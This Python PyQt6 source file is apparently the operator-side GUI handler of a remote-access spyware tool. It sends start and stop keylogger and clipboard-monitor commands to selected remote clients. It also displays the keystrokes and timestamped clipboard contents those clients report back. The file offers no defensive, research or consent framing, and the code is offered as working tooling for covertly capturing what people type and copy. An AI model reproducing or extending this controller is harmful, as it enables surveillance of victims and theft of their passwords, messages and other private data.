import logging
from datetime import datetime
from PyQt6.QtCore import QMetaObject, Qt, Q_ARG
from PyQt6.QtGui import QTextCursor # For appending text nicely

logger = logging.getLogger(__name__)

class MonitoringHandler:
    """Handles keylogger functionality."""

    def __init__(self, main_window):
        self.main_window = main_window
        # Access main_window attributes:
        # self.main_window.keylog_text
        # self.main_window.clipboard_text
        # self.main_window.selected_client_addr_str
        # self.main_window.server_core
        # self.main_window._get_selected_client_address()

    # --- ServerCore Callback Handlers ---

    def handle_keylog(self, address, data):
        """Handles keylog updates from the client."""
        addr_str = f"{address[0]}:{address[1]}"
        if addr_str == self.main_window.selected_client_addr_str:
            QMetaObject.invokeMethod(self.main_window.keylog_text, "append",
                                   Qt.ConnectionType.QueuedConnection,
                                   Q_ARG(str, data))

    def handle_clipboard_content(self, address, content):
        """Handles clipboard updates from the server core."""
        addr_str = f"{address[0]}:{address[1]}"
        if addr_str == self.main_window.selected_client_addr_str:
             # Format the entry before sending to GUI thread
            log_entry = f"[{datetime.now().strftime('%H:%M:%S')}]\n{content}\n---"
            QMetaObject.invokeMethod(self.main_window.clipboard_text, "append", Qt.ConnectionType.QueuedConnection,
                                     Q_ARG(str, log_entry))
            # Ensure the new text is visible
            # QMetaObject.invokeMethod(self.main_window.clipboard_text, "ensureCursorVisible", Qt.ConnectionType.QueuedConnection)

    # --- GUI Actions (Called directly from MainWindow slots) ---

    def start_keylogger(self):
        """Sends command to start keylogger on client."""
        address = self.main_window._get_selected_client_address()
        if address:
            self.main_window.server_core.send_command(address, "start_keylogger")
            self.main_window.stop_keylogger_btn.setEnabled(True)
            self.main_window.start_keylogger_btn.setEnabled(False)

    def stop_keylogger(self):
        """Sends command to stop keylogger on client."""
        address = self.main_window._get_selected_client_address()
        if address:
            self.main_window.server_core.send_command(address, "stop_keylogger")
            self.main_window.stop_keylogger_btn.setEnabled(False)
            self.main_window.start_keylogger_btn.setEnabled(True)

    def start_clipboard_monitor(self):
        """Sends command to start clipboard monitor on selected client."""
        mw = self.main_window
        address = mw._get_selected_client_address()
        if address:
             logger.info(f"Starting clipboard monitor for {mw.selected_client_addr_str}")
             if mw.server_core:
                 success = mw.server_core.send_command(address, 'start_clipboard_monitor')
                 if not success:
                      mw._show_message_box("Error", "Failed to send start clipboard monitor command.", "warning")
             else:
                  logger.error("Server core unavailable.")
                  mw._show_message_box("Error", "Server connection lost.", "critical")
        else:
             mw._show_message_box("Action Failed", "No client selected.", "warning")

    def stop_clipboard_monitor(self):
        """Sends command to stop clipboard monitor on selected client."""
        mw = self.main_window
        address = mw._get_selected_client_address()
        if address:
             logger.info(f"Stopping clipboard monitor for {mw.selected_client_addr_str}")
             if mw.server_core:
                 success = mw.server_core.send_command(address, 'stop_clipboard_monitor')
                 if not success:
                      mw._show_message_box("Error", "Failed to send stop clipboard monitor command.", "warning")
             else:
                  logger.error("Server core unavailable.")
                  mw._show_message_box("Error", "Server connection lost.", "critical")
        else:
             mw._show_message_box("Action Failed", "No client selected.", "warning") 